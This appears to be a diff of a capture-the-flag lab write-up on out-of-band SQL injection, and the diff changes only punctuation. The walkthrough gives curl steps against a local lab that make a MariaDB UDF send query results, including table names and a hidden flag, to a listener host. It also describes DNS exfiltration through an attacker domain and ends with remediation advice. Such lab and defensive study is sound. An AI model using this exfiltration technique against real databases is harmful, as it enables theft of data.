@@ -5,7 +5,7 @@
 ## Root cause
 
 The card reader builds its query with raw f-string concatenation. `card`
-sits inside a single-quoted string literal with no escaping — the same
+sits inside a single-quoted string literal with no escaping, the same
 sink shape as p1_1/p1_3:
 
 ```python
@@ -16,7 +16,7 @@ cur.fetchone()  # result deliberately discarded
 ```
 
 What's different from every earlier floor is what happens after the
-query runs. The result is thrown away — the application never relays it,
+query runs. The result is thrown away: the application never relays it,
 logs it, or does anything with it. The HTTP response is identical no
 matter what `card` contains:
 
@@ -50,13 +50,13 @@ the application's own response carries zero data-dependent signal.
 
 Instead of reading the result off the response that came back from the
 request that triggered it, the tester makes the **target originate a
-second, independent network call** — to a host the tester controls —
+second, independent network call**, to a host the tester controls,
 carrying the data they're after. The confirmation is read off that
 separate channel, with no cooperation from the original response.
 
 **Why the database, not the application.** In a naive approximation of
 OOB SQLi, you might expect the *application* to relay results somewhere.
-That's not OOB SQLi — it's just a normal app making an HTTP call after
+That's not OOB SQLi, it's just a normal app making an HTTP call after
 reading from the DB. Real OOB SQLi is specifically about making the
 *database engine itself* originate that outbound call, driven by SQL the
 tester injected, with the application completely uninvolved. The
@@ -66,7 +66,7 @@ irrelevant.
 
 **Why this matters.** In a real engagement, you might be injecting into
 a background job, a webhook handler, or any other path where you'll never
-see a response. You can't add relay code to the app — you don't control
+see a response. You can't add relay code to the app: you don't control
 it. The only way to prove the injection executed and extract anything
 from it is to make the database reach out to you directly.
 
@@ -111,14 +111,14 @@ plays the role those primitives play on other platforms.
 ## The listener: `collaborator`
 
 In a real engagement, the "host the tester controls" is a server they
-own — a VPS, Burp Suite Professional's Collaborator, or a self-hosted
+own: a VPS, Burp Suite Professional's Collaborator, or a self-hosted
 alternative like [interactsh](https://github.com/projectdiscovery/interactsh).
 
 In this lab, that role is played by the `collaborator` compose service:
 a simple HTTP (and DNS) server that logs every request it receives and
 exposes them at `GET /captures`. It's only reachable from other
 containers on the compose network (by its hostname `collaborator`), not
-from your browser directly — which is why the portal proxies its captures
+from your browser directly, which is why the portal proxies its captures
 feed at `/p3/spellcard/captures`.
 
 The challenge briefing tells you the listener's address. In a real
@@ -134,7 +134,7 @@ through `http_get()` to collaborator. The OOB channel is the only
 feedback loop available; every query whose result you want to see must
 travel through it.
 
-### Step 0 — confirm the injection channel is open
+### Step 0: confirm the injection channel is open
 
 Before enumerating anything, verify the UDF fires at all with a benign
 payload:
@@ -154,7 +154,7 @@ curl -s "http://localhost:8000/p3/spellcard/captures"
 If `/ping` arrives, the injection context is open, the UDF is callable,
 and collaborator is reachable from the DB container.
 
-### Step 1 — get the current database name
+### Step 1: get the current database name
 
 ```bash
 curl -s -G "http://localhost:8000/p3/spellcard" \
@@ -167,7 +167,7 @@ Capture:
 path: /db/seiyaku_p3_spellcard
 ```
 
-### Step 2 — enumerate tables in that database
+### Step 2: enumerate tables in that database
 
 Each `http_get()` call carries one row; increment `OFFSET` to page through them:
 
@@ -184,7 +184,7 @@ curl -s -G "http://localhost:8000/p3/spellcard" \
 Two tables: `cards` (the public catalog) and `sealed_cards` (not linked
 from any visible route).
 
-### Step 3 — enumerate columns of `sealed_cards`
+### Step 3: enumerate columns of `sealed_cards`
 
 ```bash
 # OFFSET 0
@@ -198,7 +198,7 @@ curl -s -G "http://localhost:8000/p3/spellcard" \
 
 Three columns: `id`, `card_name`, `secret`. The flag is in `secret`.
 
-### Step 4 — extract the flag
+### Step 4: extract the flag
 
 The visible query selects one column (`effect`), so the UNION needs
 exactly one column too. Swap `secret` in as that column and let
@@ -240,7 +240,7 @@ Real, live output from this exact seed (condensed):
 ```
 
 The flag is in the URL path of a real HTTP GET that MariaDB's own process
-sent to collaborator — entirely separate from (and after) the blind
+sent to collaborator, entirely separate from (and after) the blind
 response the browser already received. The application sent nothing; the
 database did it.
 
@@ -255,13 +255,13 @@ glob patterns.
 The DNS channel is the one real-world defenders consistently underestimate:
 
 - **HTTP-based**: the database originates an outbound HTTP request. Easy
-  to reason about, easy to filter — a network team that reviews egress
+  to reason about, easy to filter: a network team that reviews egress
   from the database tier can catch it.
 - **DNS-based**: the database resolves a hostname built from the
   exfiltrated data (`<data>.attacker-domain.com`). The tester reads the
   confirmation off DNS query logs on their own authoritative nameserver.
   DNS resolution is treated as infrastructure plumbing, not "a network
-  request," by most egress controls — a host that blocks arbitrary
+  request," by most egress controls. A host that blocks arbitrary
   outbound HTTP from a database server often still resolves hostnames
   freely. A single UDP packet to port 53 blends into completely ordinary
   background traffic. This is why real-world OOB tooling (and real
@@ -275,7 +275,7 @@ braces, hex-encoding or Base32-encoding the payload is standard).
 
 Greed Island's game master is scrupulously consistent: every card
 resolves through the same reporting channel, and that channel tells a
-player nothing beyond "it happened." That consistency is the trap — it's
+player nothing beyond "it happened." That consistency is the trap: it's
 easy to mistake "the game master won't tell me" for "there's nothing to
 find out." But the game master reading a card and *the game itself*
 aren't the same thing. The field changes. Effects land. Word of what
@@ -287,7 +287,7 @@ to watch.
 
 ## Remediation
 
-- **Parameterized queries, always** — the root fix, same as every floor:
+- **Parameterized queries, always**, the root fix, same as every floor:
 
   ```python
   cur.execute("SELECT effect FROM cards WHERE id=%s", (card,))
@@ -307,12 +307,12 @@ to watch.
 - **Egress filtering on the database tier.** The reason OOB confirmation
   works at all is that outbound connections from the database server were
   possible in the first place. A database host with no route to arbitrary
-  external hosts — or with an explicit allowlist enforced at the network
-  layer — can't be coaxed into confirming anything via a UDF callback,
+  external hosts, or with an explicit allowlist enforced at the network
+  layer, can't be coaxed into confirming anything via a UDF callback,
   regardless of how the underlying injection is shaped. Least-privilege
   egress is the single control that would have silenced this channel
   outright, independent of the query bug.
 
-- **Least-privilege database accounts** — same as every floor: a DB user
+- **Least-privilege database accounts**, same as every floor: a DB user
   scoped only to the tables a route legitimately needs cannot reach
   `sealed_cards` or any other table the route's own queries never touch.
